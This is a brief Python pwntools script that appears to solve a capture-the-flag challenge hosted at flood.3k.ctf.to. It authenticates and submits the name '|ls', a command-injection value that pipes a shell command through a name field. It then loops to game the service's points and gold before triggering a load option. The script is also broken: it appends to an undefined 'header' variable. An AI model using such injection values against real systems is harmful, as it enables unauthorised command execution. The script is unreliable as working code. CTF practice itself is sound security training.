import sys
import socket
from pwn import *

# context.log_level = 'debug'

r = remote('flood.3k.ctf.to', 7777)

auth = '35ec04cd3b79ab89896836c69257ce86487cf55f'
name = "|ls"

r.sendafter("+ Auth?> ", auth+'\n')
r.sendafter("+ Who r u?: ", name+'\n')

gold = 0
point = 0

while True:
    
    # get header
    header += r.recvlines(12)
    
    print((point, gold))
    
    # buy gold
    if b'* u hav 1000 points' in header:
        r.sendline("2")
        r.recvlines(2)
        r.sendline("1000")
        gold += 1
        point = 0
        continue
    
    # load game
    if b'* u hav 250 gold' in header:
        r.sendline("5")
    
    # get numbers, add point
    r.sendline("1")
    val = r.recvlines(2)[1]
    nums = [int(v) for v in val.split() if v.isdigit()]
    r.sendline(str(sum(nums)))
    point += 1



quit()

